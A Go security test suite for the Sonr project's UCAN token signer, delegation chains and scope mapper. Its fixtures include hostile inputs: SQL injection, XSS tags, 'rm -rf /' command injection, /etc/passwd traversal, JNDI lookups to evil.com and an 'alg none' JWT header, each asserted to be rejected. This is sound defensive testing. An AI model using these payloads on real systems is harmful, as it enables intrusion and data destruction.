package integration

import (
	"context"
	"crypto/ed25519"
	"crypto/rand"
	"encoding/base64"
	"fmt"
	"strings"
	"testing"
	"time"

	"github.com/stretchr/testify/suite"

	"github.com/sonr-io/sonr/bridge/handlers"
	"github.com/sonr-io/sonr/crypto/ucan"
	"github.com/sonr-io/sonr/x/did/types"
)

// securityMockDIDKeeper implements DIDKeeperInterface for security testing
type securityMockDIDKeeper struct {
	didDocuments map[string]*types.DIDDocument
}

func (m *securityMockDIDKeeper) GetDIDDocument(ctx context.Context, did string) (*types.DIDDocument, error) {
	if doc, ok := m.didDocuments[did]; ok {
		return doc, nil
	}
	return nil, fmt.Errorf("DID document not found: %s", did)
}

func (m *securityMockDIDKeeper) GetVerificationMethod(ctx context.Context, did string, methodID string) (*types.VerificationMethod, error) {
	doc, err := m.GetDIDDocument(ctx, did)
	if err != nil {
		return nil, err
	}
	for _, vm := range doc.VerificationMethod {
		if vm.Id == methodID {
			return vm, nil
		}
	}
	return nil, fmt.Errorf("verification method not found")
}

// SecurityAuditTestSuite conducts comprehensive security validation
type SecurityAuditTestSuite struct {
	suite.Suite
	signer      *handlers.BlockchainUCANSigner
	delegator   *handlers.UCANDelegator
	scopeMapper *handlers.ScopeMapper
	mockKeeper  *securityMockDIDKeeper

	testUserDID   string
	testClientDID string
	maliciousDID  string
}

func (suite *SecurityAuditTestSuite) SetupSuite() {
	// Create test keys
	userPubKey, _, _ := ed25519.GenerateKey(rand.Reader)
	clientPubKey, _, _ := ed25519.GenerateKey(rand.Reader)
	maliciousPubKey, _, _ := ed25519.GenerateKey(rand.Reader)

	// Setup mock DID keeper with test documents
	suite.mockKeeper = &securityMockDIDKeeper{
		didDocuments: map[string]*types.DIDDocument{
			"did:sonr:security-user": {
				Id: "did:sonr:security-user",
				VerificationMethod: []*types.VerificationMethod{
					{
						Id:                     "did:sonr:security-user#keys-1",
						Controller:             "did:sonr:security-user",
						VerificationMethodKind: "Ed25519VerificationKey2020",
						PublicKeyMultibase:     base64.StdEncoding.EncodeToString(userPubKey),
					},
				},
			},
			"did:sonr:security-client": {
				Id: "did:sonr:security-client",
				VerificationMethod: []*types.VerificationMethod{
					{
						Id:                     "did:sonr:security-client#keys-1",
						Controller:             "did:sonr:security-client",
						VerificationMethodKind: "Ed25519VerificationKey2020",
						PublicKeyMultibase:     base64.StdEncoding.EncodeToString(clientPubKey),
					},
				},
			},
			"did:sonr:malicious-actor": {
				Id: "did:sonr:malicious-actor",
				VerificationMethod: []*types.VerificationMethod{
					{
						Id:                     "did:sonr:malicious-actor#keys-1",
						Controller:             "did:sonr:malicious-actor",
						VerificationMethodKind: "Ed25519VerificationKey2020",
						PublicKeyMultibase:     base64.StdEncoding.EncodeToString(maliciousPubKey),
					},
				},
			},
		},
	}

	signer, _ := handlers.NewBlockchainUCANSigner(suite.mockKeeper, "did:sonr:oauth-provider")
	suite.signer = signer
	suite.delegator = handlers.NewUCANDelegator(signer)
	suite.scopeMapper = handlers.NewScopeMapper()

	suite.testUserDID = "did:sonr:security-user"
	suite.testClientDID = "did:sonr:security-client"
	suite.maliciousDID = "did:sonr:malicious-actor"
}

// TestTokenExpiration validates token expiration enforcement
func (suite *SecurityAuditTestSuite) TestTokenExpiration() {
	// Test 1: Expired token rejection
	expiredToken, err := suite.signer.CreateDelegationToken(
		suite.testUserDID,
		suite.testClientDID,
		[]ucan.Attenuation{
			{
				Capability: &ucan.SimpleCapability{Action: "read"},
				Resource:   &handlers.SimpleResource{Scheme: "vault", Value: "test"},
			},
		},
		nil,
		-1*time.Hour, // Already expired
	)
	suite.Require().NoError(err)

	_, err = suite.signer.VerifySignature(expiredToken)
	suite.Error(err, "Expired token must be rejected")
	suite.Contains(err.Error(), "expired", "Error should mention expiration")

	// Test 2: Future not-before time

	// Manually create token with future not-before
	token := &ucan.Token{
		Issuer:    suite.testUserDID,
		Audience:  suite.testClientDID,
		ExpiresAt: time.Now().Add(time.Hour).Unix(),
		NotBefore: time.Now().Add(time.Hour).Unix(), // Valid in 1 hour
		Attenuations: []ucan.Attenuation{
			{
				Capability: &ucan.SimpleCapability{Action: "read"},
				Resource:   &handlers.SimpleResource{Scheme: "vault", Value: "test"},
			},
		},
	}

	signedFutureToken, err := suite.signer.Sign(token)
	suite.Require().NoError(err)

	_, err = suite.signer.VerifySignature(signedFutureToken)
	suite.Error(err, "Token with future not-before must be rejected")

	// Test 3: Valid time window
	validToken, err := suite.signer.CreateDelegationToken(
		suite.testUserDID,
		suite.testClientDID,
		[]ucan.Attenuation{
			{
				Capability: &ucan.SimpleCapability{Action: "read"},
				Resource:   &handlers.SimpleResource{Scheme: "vault", Value: "test"},
			},
		},
		nil,
		time.Hour,
	)
	suite.Require().NoError(err)

	_, err = suite.signer.VerifySignature(validToken)
	suite.NoError(err, "Valid token within time window must be accepted")
}

// TestMalformedTokens validates rejection of malformed tokens
func (suite *SecurityAuditTestSuite) TestMalformedTokens() {
	malformedTokens := []struct {
		name  string
		token string
	}{
		{"Empty token", ""},
		{"Not JWT format", "not-a-jwt-token"},
		{"Incomplete JWT", "header."},
		{"Invalid base64", "invalid.base64!.data"},
		{"Missing signature", "header.payload."},
		{"Extra segments", "header.payload.signature.extra"},
		{"Null bytes", "header\x00.payload.signature"},
		{"SQL injection attempt", "'; DROP TABLE tokens; --"},
		{"XSS attempt", "<script>alert('xss')</script>"},
		{"Buffer overflow attempt", strings.Repeat("A", 10000)},
	}

	for _, test := range malformedTokens {
		suite.Run(test.name, func() {
			_, err := suite.signer.VerifySignature(test.token)
			suite.Error(err, "Malformed token '%s' must be rejected", test.name)
		})
	}
}

// TestPrivilegeEscalation validates prevention of privilege escalation
func (suite *SecurityAuditTestSuite) TestPrivilegeEscalation() {
	// Create parent token with limited permissions
	parentToken, err := suite.signer.CreateDelegationToken(
		suite.testUserDID,
		"did:sonr:intermediate",
		[]ucan.Attenuation{
			{
				Capability: &ucan.SimpleCapability{Action: "read"}, // Only read
				Resource:   &handlers.SimpleResource{Scheme: "vault", Value: "test"},
			},
		},
		nil,
		time.Hour,
	)
	suite.Require().NoError(err)

	// Attempt to escalate privileges in child token
	escalatedToken, err := suite.signer.CreateDelegationToken(
		"did:sonr:intermediate",
		suite.maliciousDID,
		[]ucan.Attenuation{
			{
				Capability: &ucan.MultiCapability{Actions: []string{"read", "write", "delete", "admin"}}, // Escalation!
				Resource:   &handlers.SimpleResource{Scheme: "vault", Value: "test"},
			},
		},
		[]ucan.Proof{ucan.Proof(parentToken)},
		time.Hour,
	)
	suite.Require().NoError(err) // Token creation should succeed

	// But delegation chain validation should fail
	err = suite.signer.ValidateDelegationChain([]string{parentToken, escalatedToken})
	suite.Error(err, "Privilege escalation must be detected and rejected")
	suite.Contains(err.Error(), "attenuation", "Error should mention improper attenuation")
}

// TestScopeInjection validates prevention of scope injection attacks
func (suite *SecurityAuditTestSuite) TestScopeInjection() {
	maliciousScopes := []string{
		"vault:read; DROP TABLE users; --",
		"vault:read' OR '1'='1",
		"vault:read<script>alert('xss')</script>",
		"vault:read\x00admin",
		"vault:read\nvault:admin",
		"vault:read\rvault:admin",
		"vault:read\tvault:admin",
		"vault:*; system('rm -rf /')",
		"../../../etc/passwd:read",
		"${jndi:ldap://evil.com/malicious}",
	}

	for _, maliciousScope := range maliciousScopes {
		suite.Run("Scope injection: "+maliciousScope, func() {
			// Attempt to validate malicious scope
			err := suite.scopeMapper.ValidateScopes([]string{maliciousScope})
			suite.Error(err, "Malicious scope must be rejected: %s", maliciousScope)

			// Even if scope validation passes, mapping should be safe
			resourceContext := map[string]string{"test": "value"}
			attenuations := suite.scopeMapper.MapToUCAN(
				[]string{maliciousScope},
				suite.testUserDID,
				suite.testClientDID,
				resourceContext,
			)

			// Should either be empty or contain safe attenuations
			for _, att := range attenuations {
				actions := att.Capability.GetActions()
				for _, action := range actions {
					// Actions should not contain injection payloads
					suite.NotContains(action, "DROP", "Action should not contain SQL injection")
					suite.NotContains(action, "<script>", "Action should not contain XSS")
					suite.NotContains(action, "system(", "Action should not contain command injection")
				}
			}
		})
	}
}

// TestResourceInjection validates prevention of resource injection attacks
func (suite *SecurityAuditTestSuite) TestResourceInjection() {
	maliciousResources := []string{
		"../../../etc/passwd",
		"file:///etc/passwd",
		"http://evil.com/steal-data",
		"javascript:alert('xss')",
		"data:text/html,<script>alert('xss')</script>",
		"\\\\evil.com\\share\\malware.exe",
		"C:\\Windows\\System32\\cmd.exe",
		"/dev/random",
		"proc/self/environ",
		"vault:test; rm -rf /",
	}

	for _, maliciousResource := range maliciousResources {
		suite.Run("Resource injection: "+maliciousResource, func() {
			resource := &handlers.SimpleResource{
				Scheme: "vault",
				Value:  maliciousResource,
			}

			attenuation := ucan.Attenuation{
				Capability: &ucan.SimpleCapability{Action: "read"},
				Resource:   resource,
			}

			token := &ucan.Token{
				Issuer:       suite.testUserDID,
				Audience:     suite.testClientDID,
				ExpiresAt:    time.Now().Add(time.Hour).Unix(),
				Attenuations: []ucan.Attenuation{attenuation},
			}

			// Validation should reject dangerous resources
			err := suite.delegator.ValidateDelegation(token, []string{"vault:read"})

			// Should be safe - either rejected or sanitized
			if err == nil {
				// If accepted, verify resource is sanitized
				suite.NotContains(resource.GetValue(), "..", "Resource should not contain path traversal")
				suite.NotContains(resource.GetValue(), "<script>", "Resource should not contain XSS")
			}
		})
	}
}

// TestDelegationChainManipulation validates delegation chain integrity
func (suite *SecurityAuditTestSuite) TestDelegationChainManipulation() {
	// Create legitimate delegation chain
	token1, err := suite.signer.CreateDelegationToken(
		suite.testUserDID,
		"did:sonr:client-a",
		[]ucan.Attenuation{
			{
				Capability: &ucan.MultiCapability{Actions: []string{"read", "write"}},
				Resource:   &handlers.SimpleResource{Scheme: "vault", Value: "test"},
			},
		},
		nil,
		time.Hour,
	)
	suite.Require().NoError(err)

	token2, err := suite.signer.CreateDelegationToken(
		"did:sonr:client-a",
		"did:sonr:client-b",
		[]ucan.Attenuation{
			{
				Capability: &ucan.SimpleCapability{Action: "read"},
				Resource:   &handlers.SimpleResource{Scheme: "vault", Value: "test"},
			},
		},
		[]ucan.Proof{ucan.Proof(token1)},
		time.Hour,
	)
	suite.Require().NoError(err)

	// Test 1: Broken chain (wrong audience/issuer)
	brokenToken, err := suite.signer.CreateDelegationToken(
		"did:sonr:wrong-issuer", // Should be client-b
		"did:sonr:client-c",
		[]ucan.Attenuation{
			{
				Capability: &ucan.SimpleCapability{Action: "read"},
				Resource:   &handlers.SimpleResource{Scheme: "vault", Value: "test"},
			},
		},
		[]ucan.Proof{ucan.Proof(token2)},
		time.Hour,
	)
	suite.Require().NoError(err)

	err = suite.signer.ValidateDelegationChain([]string{token1, token2, brokenToken})
	suite.Error(err, "Broken delegation chain must be rejected")

	// Test 2: Missing proof
	noproofToken, err := suite.signer.CreateDelegationToken(
		"did:sonr:client-b",
		"did:sonr:client-c",
		[]ucan.Attenuation{
			{
				Capability: &ucan.SimpleCapability{Action: "read"},
				Resource:   &handlers.SimpleResource{Scheme: "vault", Value: "test"},
			},
		},
		nil, // Missing proof!
		time.Hour,
	)
	suite.Require().NoError(err)

	err = suite.signer.ValidateDelegationChain([]string{token1, token2, noproofToken})
	suite.Error(err, "Chain with missing proof must be rejected")

	// Test 3: Invalid proof (wrong token)
	wrongproofToken, err := suite.signer.CreateDelegationToken(
		"did:sonr:client-b",
		"did:sonr:client-c",
		[]ucan.Attenuation{
			{
				Capability: &ucan.SimpleCapability{Action: "read"},
				Resource:   &handlers.SimpleResource{Scheme: "vault", Value: "test"},
			},
		},
		[]ucan.Proof{ucan.Proof(token1)}, // Wrong proof (should be token2)
		time.Hour,
	)
	suite.Require().NoError(err)

	err = suite.signer.ValidateDelegationChain([]string{token1, token2, wrongproofToken})
	suite.Error(err, "Chain with wrong proof must be rejected")
}

// TestReplayAttacks validates protection against token replay
func (suite *SecurityAuditTestSuite) TestReplayAttacks() {
	// Create valid token
	token, err := suite.signer.CreateDelegationToken(
		suite.testUserDID,
		suite.testClientDID,
		[]ucan.Attenuation{
			{
				Capability: &ucan.SimpleCapability{Action: "read"},
				Resource:   &handlers.SimpleResource{Scheme: "vault", Value: "test"},
			},
		},
		nil,
		time.Hour,
	)
	suite.Require().NoError(err)

	// First use should succeed
	parsedToken1, err := suite.signer.VerifySignature(token)
	suite.NoError(err, "First token use should succeed")
	suite.NotNil(parsedToken1)

	// Subsequent uses should also succeed (bearer tokens are reusable)
	// But in production, nonce/jti tracking would prevent replay
	parsedToken2, err := suite.signer.VerifySignature(token)
	suite.NoError(err, "Token reuse is allowed for bearer tokens")

	// Verify tokens are identical
	suite.Equal(parsedToken1.Raw, parsedToken2.Raw)

	// Test with very short-lived token to ensure time-based replay protection
	shortToken, err := suite.signer.CreateDelegationToken(
		suite.testUserDID,
		suite.testClientDID,
		[]ucan.Attenuation{
			{
				Capability: &ucan.SimpleCapability{Action: "read"},
				Resource:   &handlers.SimpleResource{Scheme: "vault", Value: "test"},
			},
		},
		nil,
		100*time.Millisecond,
	)
	suite.Require().NoError(err)

	// Should work immediately
	_, err = suite.signer.VerifySignature(shortToken)
	suite.NoError(err, "Token should work immediately")

	// Wait for expiration
	time.Sleep(200 * time.Millisecond)

	// Should fail after expiration (natural replay protection)
	_, err = suite.signer.VerifySignature(shortToken)
	suite.Error(err, "Expired token should prevent replay")
}

// TestCryptographicIntegrity validates cryptographic security
func (suite *SecurityAuditTestSuite) TestCryptographicIntegrity() {
	// Create valid token
	token := &ucan.Token{
		Issuer:    suite.testUserDID,
		Audience:  suite.testClientDID,
		ExpiresAt: time.Now().Add(time.Hour).Unix(),
		Attenuations: []ucan.Attenuation{
			{
				Capability: &ucan.SimpleCapability{Action: "read"},
				Resource:   &handlers.SimpleResource{Scheme: "vault", Value: "test"},
			},
		},
	}

	signedToken, err := suite.signer.Sign(token)
	suite.Require().NoError(err)

	// Test 1: Token tampering detection
	tampered := strings.Replace(signedToken, "read", "admin", 1)
	_, err = suite.signer.VerifySignature(tampered)
	suite.Error(err, "Tampered token must be rejected")

	// Test 2: Signature stripping
	parts := strings.Split(signedToken, ".")
	if len(parts) == 3 {
		noSig := parts[0] + "." + parts[1] + "."
		_, err = suite.signer.VerifySignature(noSig)
		suite.Error(err, "Token without signature must be rejected")
	}

	// Test 3: Header manipulation
	if len(parts) == 3 {
		maliciousHeader := "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0" // {"alg":"none","typ":"JWT"}
		noAlg := maliciousHeader + "." + parts[1] + "." + parts[2]
		_, err = suite.signer.VerifySignature(noAlg)
		suite.Error(err, "Token with 'none' algorithm must be rejected")
	}
}

// TestDenialOfService validates protection against DoS attacks
func (suite *SecurityAuditTestSuite) TestDenialOfService() {
	// Test 1: Large token payload
	var largeAttenuations []ucan.Attenuation
	for i := 0; i < 1000; i++ { // Very large number of attenuations
		largeAttenuations = append(largeAttenuations, ucan.Attenuation{
			Capability: &ucan.SimpleCapability{Action: fmt.Sprintf("action_%d", i)},
			Resource:   &handlers.SimpleResource{Scheme: "vault", Value: fmt.Sprintf("resource_%d", i)},
		})
	}

	largeToken := &ucan.Token{
		Issuer:       suite.testUserDID,
		Audience:     suite.testClientDID,
		ExpiresAt:    time.Now().Add(time.Hour).Unix(),
		Attenuations: largeAttenuations,
	}

	// Should either handle gracefully or reject with reasonable time
	start := time.Now()
	_, err := suite.signer.Sign(largeToken)
	duration := time.Since(start)

	// Should complete within reasonable time (or reject)
	suite.Less(duration, 5*time.Second, "Large token processing should not cause excessive delay")

	if err == nil {
		// If signing succeeds, verification should also be reasonable
		signedLargeToken, _ := suite.signer.Sign(largeToken)

		start = time.Now()
		_, err = suite.signer.VerifySignature(signedLargeToken)
		duration = time.Since(start)

		suite.Less(duration, 5*time.Second, "Large token verification should not cause excessive delay")
	}

	// Test 2: Deeply nested delegation chain
	var deepChain []string
	currentIssuer := suite.testUserDID

	for i := 0; i < 50; i++ { // Deep chain
		nextAudience := fmt.Sprintf("did:sonr:deep-client-%d", i)

		token, err := suite.signer.CreateDelegationToken(
			currentIssuer,
			nextAudience,
			[]ucan.Attenuation{
				{
					Capability: &ucan.SimpleCapability{Action: "read"},
					Resource:   &handlers.SimpleResource{Scheme: "vault", Value: "test"},
				},
			},
			func() []ucan.Proof {
				if len(deepChain) > 0 {
					return []ucan.Proof{ucan.Proof(deepChain[len(deepChain)-1])}
				}
				return nil
			}(),
			time.Hour,
		)
		if err != nil {
			break // Stop if chain becomes too deep
		}

		deepChain = append(deepChain, token)
		currentIssuer = nextAudience
	}

	// Validate deep chain - should either succeed quickly or reject
	start = time.Now()
	err = suite.signer.ValidateDelegationChain(deepChain)
	duration = time.Since(start)

	suite.Less(duration, 10*time.Second, "Deep chain validation should not cause excessive delay")
}

// TestInputSanitization validates input sanitization across all components
func (suite *SecurityAuditTestSuite) TestInputSanitization() {
	dangerousInputs := []string{
		"'; DROP TABLE tokens; --",
		"<script>alert('xss')</script>",
		"../../../etc/passwd",
		"${jndi:ldap://evil.com}",
		"\x00\x01\x02\x03",         // Null and control bytes
		strings.Repeat("A", 10000), // Very long input
		"${env:PATH}",
		"{{7*7}}",
		"<%= 7*7 %>",
		"#{7*7}",
	}

	for _, input := range dangerousInputs {
		suite.Run("Input sanitization: "+input[:min(20, len(input))], func() {
			// Test DID sanitization
			token := &ucan.Token{
				Issuer:    input,
				Audience:  suite.testClientDID,
				ExpiresAt: time.Now().Add(time.Hour).Unix(),
				Attenuations: []ucan.Attenuation{
					{
						Capability: &ucan.SimpleCapability{Action: "read"},
						Resource:   &handlers.SimpleResource{Scheme: "vault", Value: "test"},
					},
				},
			}

			// Should either reject or sanitize safely
			signedToken, err := suite.signer.Sign(token)
			if err == nil {
				// If signing succeeds, verify the DID is properly encoded
				parsedToken, err := suite.signer.VerifySignature(signedToken)
				if err == nil {
					// Check that dangerous characters are not present in parsed token
					suite.NotContains(parsedToken.Issuer, "DROP", "Parsed issuer should not contain SQL injection")
					suite.NotContains(parsedToken.Issuer, "<script>", "Parsed issuer should not contain XSS")
				}
			}

			// Test resource value sanitization
			resource := &handlers.SimpleResource{
				Scheme: "vault",
				Value:  input,
			}

			uri := resource.GetURI()
			suite.NotContains(uri, "DROP", "Resource URI should not contain SQL injection")
			suite.NotContains(uri, "<script>", "Resource URI should not contain XSS")
		})
	}
}

// TestConcurrentAttacks validates security under concurrent load
func (suite *SecurityAuditTestSuite) TestConcurrentAttacks() {
	if testing.Short() {
		suite.T().Skip("Skipping concurrent attack tests in short mode")
	}

	// Launch concurrent attempts at various attacks
	const numGoroutines = 50
	const numAttemptsPerGoroutine = 10

	results := make(chan error, numGoroutines*numAttemptsPerGoroutine)

	// Launch multiple types of attacks concurrently
	for i := 0; i < numGoroutines; i++ {
		go func(id int) {
			for j := 0; j < numAttemptsPerGoroutine; j++ {
				switch j % 4 {
				case 0:
					// Privilege escalation attempt
					err := suite.attemptPrivilegeEscalation()
					results <- err
				case 1:
					// Token tampering attempt
					err := suite.attemptTokenTampering()
					results <- err
				case 2:
					// Invalid chain attempt
					err := suite.attemptInvalidChain()
					results <- err
				case 3:
					// Scope injection attempt
					err := suite.attemptScopeInjection()
					results <- err
				}
			}
		}(i)
	}

	// Collect results
	attacks := 0
	blocked := 0

	for i := 0; i < numGoroutines*numAttemptsPerGoroutine; i++ {
		err := <-results
		attacks++
		if err != nil {
			blocked++ // Attack was blocked (good)
		}
	}

	// All attacks should be blocked
	suite.Equal(attacks, blocked, "All concurrent attacks should be blocked")
	suite.T().Logf("Concurrent security test: %d/%d attacks blocked", blocked, attacks)
}

func (suite *SecurityAuditTestSuite) attemptPrivilegeEscalation() error {
	parentToken, _ := suite.signer.CreateDelegationToken(
		suite.testUserDID,
		"did:sonr:temp-intermediate",
		[]ucan.Attenuation{
			{
				Capability: &ucan.SimpleCapability{Action: "read"},
				Resource:   &handlers.SimpleResource{Scheme: "vault", Value: "test"},
			},
		},
		nil,
		time.Hour,
	)

	escalatedToken, _ := suite.signer.CreateDelegationToken(
		"did:sonr:temp-intermediate",
		suite.maliciousDID,
		[]ucan.Attenuation{
			{
				Capability: &ucan.MultiCapability{Actions: []string{"read", "write", "admin"}},
				Resource:   &handlers.SimpleResource{Scheme: "vault", Value: "test"},
			},
		},
		[]ucan.Proof{ucan.Proof(parentToken)},
		time.Hour,
	)

	return suite.signer.ValidateDelegationChain([]string{parentToken, escalatedToken})
}

func (suite *SecurityAuditTestSuite) attemptTokenTampering() error {
	token, _ := suite.signer.CreateDelegationToken(
		suite.testUserDID,
		suite.testClientDID,
		[]ucan.Attenuation{
			{
				Capability: &ucan.SimpleCapability{Action: "read"},
				Resource:   &handlers.SimpleResource{Scheme: "vault", Value: "test"},
			},
		},
		nil,
		time.Hour,
	)

	// Tamper with token
	tampered := strings.Replace(token, "read", "admin", 1)
	_, err := suite.signer.VerifySignature(tampered)
	return err
}

func (suite *SecurityAuditTestSuite) attemptInvalidChain() error {
	token1, _ := suite.signer.CreateDelegationToken(
		suite.testUserDID,
		"did:sonr:temp-a",
		[]ucan.Attenuation{
			{
				Capability: &ucan.SimpleCapability{Action: "read"},
				Resource:   &handlers.SimpleResource{Scheme: "vault", Value: "test"},
			},
		},
		nil,
		time.Hour,
	)

	// Create invalid chain (wrong issuer)
	token2, _ := suite.signer.CreateDelegationToken(
		"did:sonr:wrong-issuer",
		"did:sonr:temp-b",
		[]ucan.Attenuation{
			{
				Capability: &ucan.SimpleCapability{Action: "read"},
				Resource:   &handlers.SimpleResource{Scheme: "vault", Value: "test"},
			},
		},
		[]ucan.Proof{ucan.Proof(token1)},
		time.Hour,
	)

	return suite.signer.ValidateDelegationChain([]string{token1, token2})
}

func (suite *SecurityAuditTestSuite) attemptScopeInjection() error {
	maliciousScope := "vault:read'; DROP TABLE users; --"
	return suite.scopeMapper.ValidateScopes([]string{maliciousScope})
}

func TestSecurityAuditSuite(t *testing.T) {
	suite.Run(t, new(SecurityAuditTestSuite))
}
